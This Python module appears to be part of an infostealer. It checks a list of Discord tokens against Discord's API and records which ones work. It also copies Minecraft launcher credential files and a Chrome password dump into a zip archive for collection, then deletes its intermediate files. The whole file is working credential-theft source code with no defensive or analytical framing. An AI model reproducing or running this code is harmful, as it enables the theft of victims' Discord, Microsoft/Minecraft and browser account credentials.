import os
from zipfile import ZipFile

import requests


def mkdzip(temppath):
    Zip = ZipFile(os.path.join(temppath, 'info.zip'), 'w')
    return Zip


def closezip(Zip):
    Zip.close()


def ziptokens(Zip, tokenslist, PlatformList, temppath):
    os.chdir(temppath)
    times = 1
    timesplat = 0
    brokentimes = 1
    brokenfile = "brokentokens.txt"
    workingfile = "tokens.txt"
    brokentokentxt = open(os.path.join(temppath, brokenfile), 'w')
    tokentxt = open(os.path.join(temppath, workingfile), 'w')
    for Tokens in tokenslist:
        r = requests.get("https://discord.com/api/v8/users/@me/library",
                         headers={"Authorization": Tokens, "Content-Type": "application/json"})
        try:
            if r.status_code == 200:
                tokentxt.write('Token ' + str(times) + ' found in ' + PlatformList[timesplat] + ': ' + Tokens + '\n')
                times += 1
                timesplat += 1
            else:
                brokentokentxt.write(
                    'Broken Token ' + str(brokentimes) + ' found in ' + PlatformList[timesplat] + ': ' + Tokens + '\n')
                brokentimes += 1
                timesplat += 1
        except:
            pass
    tokentxt.close()
    brokentokentxt.close()
    Zip.write(os.path.join(temppath, workingfile), arcname='Discord/tokens.txt')
    Zip.write(os.path.join(temppath, brokenfile), arcname='Discord/brokentokens.txt')
    os.remove(os.path.join(temppath, workingfile))
    os.remove(os.path.join(temppath, brokenfile))


def zipminecraft(Zip, filepath):
    files = ['launcher_accounts.json', 'launcher_msa_credentials.json', 'launcher_profiles.json']
    for file in files:
        filepath = os.path.join(filepath, file)
        Zip.write(filepath, arcname='Minecraft/' + file)

def zipchromepw(Zip, temppath):
    Zip.write(os.path.join(temppath, 'chromepw.txt'))
